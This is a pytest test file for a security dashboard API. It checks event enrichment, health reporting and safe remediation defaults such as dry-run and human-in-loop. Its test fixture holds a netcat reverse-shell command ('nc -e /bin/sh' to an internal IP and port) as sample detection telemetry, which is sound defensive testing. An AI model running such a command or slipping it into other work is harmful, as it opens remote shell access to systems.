#!/usr/bin/env python3
"""
Person 4 acceptance tests — Dashboard API integration surface.

Covers:
  1. Enriched events expose platform / privacy / explanation provenance.
  2. /api/health reports a truthful platform block (capture mode, arch, schema).
  3. Remediation config defaults are safe (dry-run + human-in-loop).
  4. The API degrades gracefully with no Redis connection.

Run with:
    pytest tests/test_dashboard_api.py -v
"""

import os
import sys

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from remediation.config import RemediationConfig

FAKE_EVENT = {
    "event_id": "evt-test-1",
    "schema_version": "1.0.0",
    "capture_mode": "fixture_replay",
    "event_source": "tetragon-replay",
    "source_host": "linuxone-node-01",
    "source_arch": "s390x",
    "timestamp": "2026-01-01T00:00:00Z",
    "source": "tetragon",
    "event_type": "process_exec",
    "node_name": "kind-worker",
    "telemetry": {
        "pid": 4242,
        "binary": "/bin/nc",
        "args": ["-e", "/bin/sh", "10.0.0.5", "4444"],
        "uid": 0,
        "user": "root",
        "cwd": "/",
        "namespace": "default",
        "pod": "attacker-pod",
        "container_id": "abc123de...",
        "parent_binary": "/usr/bin/curl",
        "parent_pid": 4821,
    },
    "privacy": {
        "enabled": True,
        "redacted": True,
        "redacted_fields": ["args.ip"],
        "policy": "standard",
    },
    "triage": {
        "grade": "TP",
        "confidence": 0.95,
        "basis": "heuristic_rules",
        "score_type": "risk_score",
        "risk_score": 9,
        "evidence": ["process runs as uid 0 (root) +2"],
    },
    "explanation": {
        "mitre_id": "T1059",
        "guidance": "Heuristic rule engine identified True Positive (risk_score=9).",
        "confidence_semantics": "Rule-engine confidence is not a calibrated probability.",
        "recommended_action": "Escalate to a human analyst before any remediation.",
    },
}


@pytest.fixture
def dashboard(monkeypatch):
    """dashboard_api with Redis disabled and a deterministic event cache."""
    import dashboard_api

    monkeypatch.setattr(dashboard_api, "_redis", None)
    monkeypatch.setattr(dashboard_api, "_remediation_config", RemediationConfig())
    monkeypatch.setattr(
        dashboard_api,
        "_event_cache",
        [dashboard_api._enrich_event_for_dashboard(dict(FAKE_EVENT))],
    )
    return dashboard_api


@pytest.fixture
def client(dashboard):
    return TestClient(dashboard.app)


# ── 1. Event enrichment ─────────────────────────────────────────────


class TestEventEnrichment:
    def test_platform_block_is_exposed(self, dashboard):
        enriched = dashboard._event_cache[0]
        platform = enriched["platform"]

        assert platform["capture_mode"] == "fixture_replay"
        assert platform["source_arch"] == "s390x"
        assert platform["source_host"] == "linuxone-node-01"
        assert platform["schema_version"] == "1.0.0"

    def test_privacy_markers_pass_through(self, dashboard):
        enriched = dashboard._event_cache[0]
        privacy = enriched["privacy"]

        assert privacy["redacted"] is True
        assert "args.ip" in privacy["redacted_fields"]
        assert privacy["policy"] == "standard"

    def test_explanation_carries_provenance_and_mitre_link(self, dashboard):
        explanation = dashboard._event_cache[0]["explanation"]

        assert explanation["mitre_id"]
        assert explanation["mitre_url"].startswith("https://attack.mitre.org/")
        assert explanation["basis"] in ("heuristic_rules", "model+heuristic_gates", "unknown")
        assert explanation["confidence_semantics"]
        assert explanation["recommended_action"]

    def test_missing_privacy_block_gets_safe_default(self, dashboard):
        bare = {k: v for k, v in FAKE_EVENT.items() if k != "privacy"}
        enriched = dashboard._enrich_event_for_dashboard(dict(bare))

        assert enriched["privacy"]["redacted"] is False
        assert enriched["privacy"]["redacted_fields"] == []


# ── 2. /api/events ──────────────────────────────────────────────────


class TestEventsEndpoint:
    def test_events_include_platform_and_privacy(self, client):
        response = client.get("/api/events")

        assert response.status_code == 200
        events = response.json()["events"]
        assert len(events) == 1

        event = events[0]
        assert event["platform"]["capture_mode"] == "fixture_replay"
        assert event["privacy"]["redacted"] is True
        assert event["explanation"]["mitre_id"]


# ── 3. /api/health ──────────────────────────────────────────────────


class TestHealthEndpoint:
    def test_health_reports_platform_truthfully(self, client):
        response = client.get("/api/health")

        assert response.status_code == 200
        data = response.json()

        platform = data["platform"]
        assert platform["capture_mode"] == "fixture_replay"
        assert platform["source_arch"] == "s390x"
        assert platform["hardware"] == "IBM LinuxONE (s390x)"
        assert platform["live_capture"] is False
        assert platform["schema_version"] == "1.0.0"

    def test_health_degrades_without_redis(self, client):
        data = client.get("/api/health").json()

        assert data["components"]["redis"]["status"] == "disconnected"
        assert data["components"]["redis"]["stream"] == "security:events"
        assert data["status"] in ("ok", "degraded")

    def test_health_includes_safe_remediation_config(self, client):
        data = client.get("/api/health").json()
        remediation = data["components"]["remediation_agent"]

        assert remediation["dry_run"] is True
        assert remediation["autonomy_mode"] == "human-in-loop"


# ── 4. Remediation config endpoints ─────────────────────────────────


class TestRemediationConfig:
    def test_config_defaults_are_safe(self, client):
        response = client.get("/api/remediation/config")

        assert response.status_code == 200
        config = response.json()
        assert config["dry_run"] is True
        assert config["autonomy_mode"] == "human-in-loop"
        assert config["sigkill_threshold"] == 0.85
        assert config["yaml_threshold"] == 0.75

    def test_invalid_update_rejected(self, client):
        response = client.post(
            "/api/remediation/config",
            json={"autonomy_mode": "unbounded"},
        )

        assert response.status_code == 400
        assert "Invalid autonomy_mode" in response.json()["error"]


# ── 5. Unknown event behaviour ──────────────────────────────────────


class TestExplainEndpoint:
    def test_unknown_event_returns_404(self, client):
        response = client.get("/api/explain/does-not-exist")
        assert response.status_code == 404
